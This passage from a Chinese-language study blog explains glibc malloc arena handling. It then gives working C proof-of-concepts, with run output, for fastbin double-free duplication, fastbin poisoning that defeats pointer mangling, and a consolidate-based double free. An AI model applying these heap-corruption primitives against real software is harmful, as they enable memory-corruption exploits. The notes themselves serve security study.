class="line"></span><br></pre></td></tr></table></figure>

<p>如果TCB中有定义multiple_threads字段,则检查该字段是否为1</p>
<p>否则检查glibc的<code>__libc_multiple_threads</code>变量是否为1</p>
<p>在x86上使用前者</p>
<p>这个多线程字段会指导malloc的行为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (SINGLE_THREAD_P)		<span class="comment">//单线程时的行为</span></span><br><span class="line">   &#123;</span><br><span class="line">     victim = tag_new_usable (_int_malloc (&amp;main_arena, bytes));</span><br><span class="line">     assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">     <span class="keyword">return</span> victim;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//下为多线程时行为</span></span><br><span class="line"> arena_get (ar_ptr, bytes);	</span><br><span class="line"></span><br><span class="line"> victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line"> <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">    before.  */</span></span><br><span class="line"> <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">     ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">     victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">   __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line"> victim = tag_new_usable (victim);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在多线程场景下</p>
<p>首先尝试<code>arena_get(ar_ptr = NULL,bytes)</code>拿到一个分配区</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#define arena_get(ptr, size) do &#123; \</span><br><span class="line">      ptr = thread_arena;						      \</span><br><span class="line">      arena_lock (ptr, size);						      \</span><br><span class="line">  &#125; while (0)</span><br><span class="line"></span><br><span class="line">#define arena_lock(ptr, size) do &#123;					      \</span><br><span class="line">      if (ptr)								      \</span><br><span class="line">        __libc_lock_lock (ptr-&gt;mutex);					      \</span><br><span class="line">      else								      \</span><br><span class="line">        ptr = arena_get2 ((size), NULL);				      \</span><br><span class="line">  &#125; while (0)</span><br></pre></td></tr></table></figure>

<p>主线程会有<code>thread_arena = &amp;main_arena</code></p>
<p>对于其他线程,第一次尝试分配时,<code>thread_arena = NULL</code></p>
<p>此时会调用<code>arena_get2</code>,这个函数会尝试找一个当前空闲的分配区,如果有则返回</p>
<p>如果没有会尝试新创建一个分配区,如果已经达到了分配区数量上限,只能等着</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> mstate</span><br><span class="line"><span class="title function_">arena_get2</span> <span class="params">(<span class="type">size_t</span> size, mstate avoid_arena)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate a;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> <span class="type">size_t</span> narenas_limit;</span><br><span class="line"></span><br><span class="line">  a = get_free_list ();	<span class="comment">//尝试从freelist上拿一个分配区</span></span><br><span class="line">  <span class="keyword">if</span> (a == <span class="literal">NULL</span>)  <span class="comment">//如果a == NULL说明当前没有空闲的分配区</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Nothing immediately available, so generate a new arena.  */</span></span><br><span class="line">      <span class="keyword">if</span> (narenas_limit == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (mp_.arena_max != <span class="number">0</span>) <span class="comment">//如果分配区数量有明确配置的上限</span></span><br><span class="line">            narenas_limit = mp_.arena_max;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> (narenas &gt; mp_.arena_test)<span class="comment">//否则</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="type">int</span> n = __get_nprocs_sched ();<span class="comment">//获取能够使用的CPU核心数</span></span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (n &gt;= <span class="number">1</span>)</span><br><span class="line">                narenas_limit = NARENAS_FROM_NCORES (n);<span class="comment">//在x86_64上最多是8*n</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                <span class="comment">/* We have no information about the system.  Assume two</span></span><br><span class="line"><span class="comment">                   cores.  */</span></span><br><span class="line">                narenas_limit = NARENAS_FROM_NCORES (<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    repeat:;</span><br><span class="line">      <span class="type">size_t</span> n = narenas;</span><br><span class="line">      <span class="comment">/* NB: the following depends on the fact that (size_t)0 - 1 is a</span></span><br><span class="line"><span class="comment">         very large number and that the underflow is OK.  If arena_max</span></span><br><span class="line"><span class="comment">         is set the value of arena_test is irrelevant.  If arena_test</span></span><br><span class="line"><span class="comment">         is set but narenas is not yet larger or equal to arena_test</span></span><br><span class="line"><span class="comment">         narenas_limit is 0.  There is no possibility for narenas to</span></span><br><span class="line"><span class="comment">         be too big for the test to always fail since there is not</span></span><br><span class="line"><span class="comment">         enough address space to create that many arenas.  */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (n &lt;= narenas_limit - <span class="number">1</span>))  <span class="comment">//还能创建新的分配区</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (catomic_compare_and_exchange_bool_acq (&amp;narenas, n + <span class="number">1</span>, n))</span><br><span class="line">            <span class="keyword">goto</span> repeat;</span><br><span class="line">          a = _int_new_arena (size);    <span class="comment">//创建新分配区</span></span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (a == <span class="literal">NULL</span>))</span><br><span class="line">            catomic_decrement (&amp;narenas);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span>    <span class="comment">//无法创建新分配区,此时只能轮询已有的分配区等待</span></span><br><span class="line">        a = reused_arena (avoid_arena); </span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里<code>freelist</code>用于在多线程场景下,保存当前空闲的分配区</p>
<p>分配区<code>malloc_state</code>中有一个<code>next_free</code>就是单链表后继指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* offset      |    size */</span>  type = <span class="keyword">struct</span> malloc_state &#123;</span><br><span class="line"><span class="comment">/* 0x0000      |  0x0004 */</span>    <span class="type">__libc_lock_t</span> mutex;</span><br><span class="line"><span class="comment">/* 0x0004      |  0x0004 */</span>    <span class="type">int</span> flags;</span><br><span class="line"><span class="comment">/* 0x0008      |  0x0004 */</span>    <span class="type">int</span> have_fastchunks;</span><br><span class="line"><span class="comment">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="comment">/* 0x0010      |  0x0050 */</span>    mfastbinptr fastbinsY[<span class="number">10</span>];</span><br><span class="line"><span class="comment">/* 0x0060      |  0x0008 */</span>    mchunkptr top;</span><br><span class="line"><span class="comment">/* 0x0068      |  0x0008 */</span>    mchunkptr last_remainder;</span><br><span class="line"><span class="comment">/* 0x0070      |  0x07f0 */</span>    mchunkptr bins[<span class="number">254</span>];</span><br><span class="line"><span class="comment">/* 0x0860      |  0x0010 */</span>    <span class="type">unsigned</span> <span class="type">int</span> binmap[<span class="number">4</span>];</span><br><span class="line"><span class="comment">/* 0x0870      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/* 0x0878      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"><span class="comment">/* 0x0880      |  0x0008 */</span>    <span class="type">size_t</span> attached_threads;</span><br><span class="line"><span class="comment">/* 0x0888      |  0x0008 */</span>    <span class="type">size_t</span> system_mem;</span><br><span class="line"><span class="comment">/* 0x0890      |  0x0008 */</span>    <span class="type">size_t</span> max_system_mem;</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes): 2200 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>

<p>如果freelist为空,说明当前没有空闲的分配区,但是哥们急着要用堆块,怎么办呢? 尝试创建一个新的分配区</p>
<p>但也不是一急就得立刻创建新分配区, 这个分配区有一个数量上限,<code>8*核心数</code></p>
<p>如果能够创建,那么就调用<code>_int_new_arena</code>创建新分配区</p>
<p>这个函数会调用<code>new_heap</code>,继而调用<code>alloc_new_heap</code>函数创建一个<code>heap_info</code>结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h = new_heap (size + (<span class="keyword">sizeof</span> (*h) + <span class="keyword">sizeof</span> (*a) + MALLOC_ALIGNMENT), mp_.top_pad);</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">heap_info *h = alloc_new_heap (size, top_pad, mp_.hp_pagesize, mp_.hp_flags);</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p2 = (<span class="type">char</span> *) MMAP (aligned_heap_area, max_size, PROT_NONE, mmap_flags);</span><br></pre></td></tr></table></figure>

<p>实际上会调用mmap系统调用向操作系统要一大块空间</p>
<h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><h3 id="fastbins"><a href="#fastbins" class="headerlink" title="fastbins"></a>fastbins</h3><h4 id="double-free-dup"><a href="#double-free-dup" class="headerlink" title="double free dup"></a>double free dup</h4><p><code>fastbins</code>中对于二次释放的判断很唐氏</p>
<p><code>fastbins</code>只会判断当前正在释放的堆块和挂在桶子头上的第一块是不是相同, 如果是就认为是<code>Double Free</code>了</p>
<p>如果<code>fastbin</code>上这样:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin[idx] =&gt; A =&gt; B =&gt; NULL</span><br></pre></td></tr></table></figure>

<p>此时释放<code>B</code>就可以绕过检查造成<code>Double Free</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin[idx] =&gt; B =&gt; A =&gt; B =&gt; NULL</span><br></pre></td></tr></table></figure>



<p>这又有个问题,使用<code>malloc</code>申请内存时</p>
<p>如果<code>tcachebins</code>中有东西,那么<code>malloc</code>会从<code>tcache</code>中拿,不会拿<code>fastbins</code>的</p>
<p>但是如果<code>tcachebins</code>中没东西,那么当从<code>fastbins</code>中拿一个之后,剩下的都会被放到<code>tcachebins</code>中</p>
<p>为了避免<code>tcache</code>抢东西,可以使用<code>calloc</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">malloc =&gt; __libc_malloc	//此处首先尝试从tcache获取堆块</span><br><span class="line">	_int_malloc			//此处尝试从斌家获取</span><br><span class="line">	</span><br><span class="line">calloc =&gt; __libc_malloc	//不使用tcache,直接调用_int_malloc</span><br><span class="line">	_int_malloc			//此处尝试从斌家获取,但是如果tcache不满,还是会抢斌家的填满tcache</span><br></pre></td></tr></table></figure>

<p>为了避免<code>tcache</code>造成影响,可以首先将<code>tcache</code>填满,目的是在斌家分配一次后,避免剩余的堆块进入<code>tcache</code></p>
<p>然后使用<code>calloc</code>函数分配,目的是避免从<code>tcache</code>中取堆块</p>
<p>写个<code>exp</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;printf this time will establish a write buffer\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *A;</span><br><span class="line">    <span class="type">size_t</span> *B;</span><br><span class="line">    <span class="type">size_t</span> *C;</span><br><span class="line">    <span class="comment">// size_t *barrier;        </span></span><br><span class="line">    A = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    B = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;       </span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;       <span class="comment">//fill tcache</span></span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(B);                    <span class="comment">//next free to fastbin</span></span><br><span class="line">    <span class="built_in">free</span>(A);</span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">    <span class="comment">//fastbins[idx] =&gt; B =&gt; A =&gt; B</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    B = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);           <span class="comment">//next malloc from fastbin</span></span><br><span class="line">    A = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line">    C = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;B: %p\n&quot;</span>, B);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A: %p\n&quot;</span>, A);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;C: %p\n&quot;</span>, C);</span><br><span class="line">    assert(B == C);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins# make</span><br><span class="line">gcc -w -g -o fastbin_dup fastbin_dup.c -o fastbin_dup</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins# ./fastbin_dup</span><br><span class="line"><span class="built_in">printf</span> this time will establish a write buffer</span><br><span class="line">B: 0x55dd112b2700</span><br><span class="line">A: 0x55dd112b26b0</span><br><span class="line">C: 0x55dd112b2700</span><br></pre></td></tr></table></figure>

<h4 id="poison"><a href="#poison" class="headerlink" title="poison"></a>poison</h4><p>利用<code>Double Free</code>,或者其他手段, 使得堆管理器持有某个堆块指针的同时, 我们也持有一个</p>
<p>此时我们利用这个指针进行<code>Use After Free</code>, 对该已经释放的堆块进行写入操作, 覆盖该堆块的元数据, 修改<code>fd</code>指针指向任意地址</p>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> sz  0x40</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> prev_size;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span>* fd;</span><br><span class="line">    <span class="type">size_t</span>* bk;</span><br><span class="line">&#125;malloc_chunk;</span><br><span class="line"></span><br><span class="line">malloc_chunk fake_chunk=&#123;</span><br><span class="line">    .prev_size = <span class="number">0</span>,</span><br><span class="line">    .size = (sz + <span class="number">0x10</span>) | <span class="number">1</span>,</span><br><span class="line">    .fd = <span class="number">0</span>,</span><br><span class="line">    .bk = <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;printf this time will establish a write buffer\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> * tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> * A;</span><br><span class="line">    <span class="type">size_t</span> * B;</span><br><span class="line">    <span class="type">size_t</span> * C;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = (<span class="type">size_t</span>*)<span class="built_in">malloc</span>(sz);</span><br><span class="line">    &#125;</span><br><span class="line">    A = (<span class="type">size_t</span>*)<span class="built_in">malloc</span>(sz);</span><br><span class="line">    B = (<span class="type">size_t</span>*)<span class="built_in">malloc</span>(sz);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;           <span class="comment">//fill tcache</span></span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(A);                        <span class="comment">//free to fastbin</span></span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">    <span class="built_in">free</span>(A);</span><br><span class="line">    <span class="comment">//fastbins[idx] =&gt; A =&gt; B =&gt; A</span></span><br><span class="line"></span><br><span class="line">    A = <span class="built_in">calloc</span>(<span class="number">1</span>,sz);</span><br><span class="line">    B = <span class="built_in">calloc</span>(<span class="number">1</span>,sz);</span><br><span class="line">    <span class="comment">//fastbins[idx] =&gt; A</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> * fake_chunk_mem = (<span class="type">char</span>*)&amp;fake_chunk + <span class="number">0x10</span>;</span><br><span class="line">    A[<span class="number">0</span>] = ((<span class="type">size_t</span>)A &gt;&gt; <span class="number">12</span>) ^ (<span class="type">size_t</span>)&amp;fake_chunk;</span><br><span class="line">    <span class="comment">//fastbins[idx] =&gt; A =&gt; fake_chunk</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk_mem = %p\n&quot;</span>, fake_chunk_mem);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A = %p\n&quot;</span>, A);</span><br><span class="line">    A = <span class="built_in">calloc</span>(<span class="number">1</span>,sz);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A = %p\n&quot;</span>, A);</span><br><span class="line">    C = <span class="built_in">calloc</span>(<span class="number">1</span>,sz);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;C = %p\n&quot;</span>, C);</span><br><span class="line">    assert(C == fake_chunk_mem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# make</span><br><span class="line">gcc -w -g -o fastbin_poison fastbin_poison.c -o fastbin_poison</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./fastbin_poison</span><br><span class="line"><span class="built_in">printf</span> this time will establish a write buffer</span><br><span class="line">fake_chunk_mem = 0x55d7ebf53030</span><br><span class="line">A = 0x55d7ed23d8e0</span><br><span class="line">A = 0x55d7ed23d8e0</span><br><span class="line">C = 0x55d7ebf53030</span><br></pre></td></tr></table></figure>



<h4 id="dup-with-consolidate"><a href="#dup-with-consolidate" class="headerlink" title="dup_with_consolidate"></a>dup_with_consolidate</h4><p>0.填充<code>tcache</code></p>
<p>1.找一个与<code>topchunk</code>相邻的小堆块,<code>free</code>进入<code>fastbins</code>,&#x3D;&#x3D;并继续持有其指针&#x3D;&#x3D;</p>
<p>2.发起<code>0x400</code>字节的分配申请,导致<code>malloc_consolidate</code>,使得<code>fastbins</code>中的堆块合并到<code>topchunk</code>,然后本次申请拿到同一个指针,但是堆块大小变成了<code>0x411</code>(包括元数据,标志位和用户空间)</p>
<p>3.<code>free</code>小堆块的野指针,这实际上会导致大块被释放进入<code>unsortedbin</code></p>
<p>4.再次发起<code>0x400</code>字节的分配申请,再次拿到同一个堆块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;this printf will establish the write buffer\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> * tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> * A;</span><br><span class="line">    <span class="type">size_t</span> * B;</span><br><span class="line">    <span class="type">size_t</span> * C;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;++i)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    A = <span class="built_in">malloc</span>(<span class="number">0x40</span>);           <span class="comment">//malloc a chunk next to the topchunk</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;++i)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]); <span class="comment">//fill the tcache</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// A = calloc(1,0x40);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A:%p\n&quot;</span>,A);</span><br><span class="line">    <span class="built_in">free</span>(A);                    <span class="comment">//return A back to fastbins</span></span><br><span class="line"></span><br><span class="line">    B = <span class="built_in">malloc</span>(<span class="number">0x400</span>);          <span class="comment">//cause a malloc_consolidate , merge A with the topchunk , then malloc B with the same address of A</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;B:%p\n&quot;</span>,B);</span><br><span class="line">    assert(A == B);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(A);                    <span class="comment">//double free A , then B will be free</span></span><br><span class="line"></span><br><span class="line">    C = <span class="built_in">malloc</span>(<span class="number">0x400</span>);          <span class="comment">//malloc C at the same address of B </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;C:%p\n&quot;</span>,C);</span><br><span class="line">    assert(C == B);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



